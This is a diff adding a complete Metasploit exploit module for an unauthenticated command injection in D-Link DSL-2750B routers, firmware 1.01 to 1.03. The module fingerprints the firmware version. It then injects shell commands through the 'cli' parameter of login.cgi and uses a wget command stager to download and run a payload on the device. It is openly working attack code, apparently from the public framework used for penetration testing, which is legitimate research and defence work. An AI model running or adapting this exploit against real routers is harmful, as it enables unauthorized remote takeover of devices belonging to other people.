@@ -1,0 +1,114 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'D-Link DSL-2750B OS Command Injection',
+      'Description'    => %q(
+        This module exploits a remote command injection vulnerability in D-Link DSL-2750B devices.
+        Vulnerability can be exploited through "cli" parameter that is directly used to invoke
+        "ayecli" binary. Vulnerable firmwares are from 1.01 up to 1.03.
+      ),
+      'Author'         =>
+        [
+          'p@ql', # vulnerability discovery
+          'Marcin Bury <marcin[at]threat9.com>' # metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['PACKETSTORM', 135706],
+          ['URL', 'http://seclists.org/fulldisclosure/2016/Feb/53'],
+          ['URL', 'http://www.quantumleap.it/d-link-router-dsl-2750b-firmware-1-01-1-03-rce-no-auth/']
+        ],
+      'Targets'        =>
+        [
+          [
+            'Linux mipsbe Payload',
+            {
+              'Arch' => ARCH_MIPSBE,
+              'Platform' => 'linux'
+            }
+          ],
+          [
+            'Linux mipsel Payload',
+            {
+              'Arch' => ARCH_MIPSLE,
+              'Platform' => 'linux'
+            }
+          ]
+        ],
+      'DisclosureDate'  => 'Feb 5 2016',
+      'DefaultTarget'   => 0))
+
+    deregister_options('CMDSTAGER::FLAVOR')
+  end
+
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => '/ayefeaturesconvert.js'
+    )
+
+    unless res
+      vprint_error('Connection failed')
+      return CheckCode::Unknown
+    end
+
+    unless res.code.to_i == 200 && res.body.include?('DSL-2750')
+      vprint_status('Remote host is not a DSL-2750')
+      return CheckCode::Safe
+    end
+
+    if res.body =~ /var AYECOM_FWVER="(\d.\d+)";/
+      version = Regexp.last_match[1]
+      vprint_status("Remote host is a DSL-2750B with firmware version #{version}")
+      if version >= "1.01" && version <= "1.03"
+        return Exploit::CheckCode::Appears
+      end
+    end
+
+    CheckCode::Safe
+  rescue ::Rex::ConnectionError
+    vprint_error('Connection failed')
+    return CheckCode::Unknown
+  end
+
+  def execute_command(cmd, _opts)
+    payload = Rex::Text.uri_encode("multilingual show';#{cmd}'")
+    send_request_cgi(
+      {
+        'method' => 'GET',
+        'uri' => '/login.cgi',
+        'vars_get' => {
+          'cli' => "#{payload}$"
+        },
+        'encode_params' => false
+      },
+      5
+    )
+  rescue ::Rex::ConnectionError
+    fail_with(Failure::Unreachable, "#{peer} Failed to connect to the web server")
+  end
+
+  def exploit
+    print_status("#{peer} Checking target version...")
+
+    unless check == Exploit::CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
+    end
+
+    execute_cmdstager(
+      flavor: :wget,
+      linemax: 200
+    )
+  end
+end
